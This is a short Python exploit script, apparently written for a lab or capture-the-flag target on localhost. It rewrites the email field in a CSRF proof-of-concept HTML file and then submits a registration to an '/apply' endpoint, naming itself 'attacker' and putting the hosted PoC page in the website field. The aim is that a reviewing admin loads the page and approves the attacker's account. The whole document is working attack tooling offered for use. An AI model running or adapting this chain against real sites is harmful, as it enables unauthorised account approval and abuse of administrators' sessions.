import requests
import argparse
from bs4 import BeautifulSoup

proxy = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def updating_mail(email):
    with open('csrf-poc.html', 'r') as file:
        content = file.read()

    soup = BeautifulSoup(content, 'html.parser')
    input_elements = soup.find_all('input')

    for input_element in input_elements:
        if input_element.get('name') == 'email':
            # Updating Mail
            input_element['value'] = email
            updated_html = str(soup)
            # Replacing csrf-poc.html to updated mail
            with open('csrf-poc.html', 'w') as file:
                file.write(updated_html)
    print("[✅] Email Updated")

def request_exploit(email, pwd):
    data = {
        'name':'attacker',
        'email': email,
        'website':'http://127.0.0.1:5500/csrf-poc.html', # make sure server for payload/poc is on
        'secret_phrase':'secret',
        'password': pwd,
        'password2': pwd
    }
    target_url = "http://localhost/apply"
    r = requests.post(url=target_url, data=data, proxies=proxy)
    if r.status_code == 200:
        print("[✅] Account Created and Approved")
    else:
        print("[❌] Something Wrong")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--email', '-e', required=True, dest='email', help='Email to Register')
    parser.add_argument('--pass', '-p', required=True, dest='password', help='Password to Register')
    args = parser.parse_args()

    email = args.email
    passwd = args.password
    updating_mail(email)
    request_exploit(email, passwd)
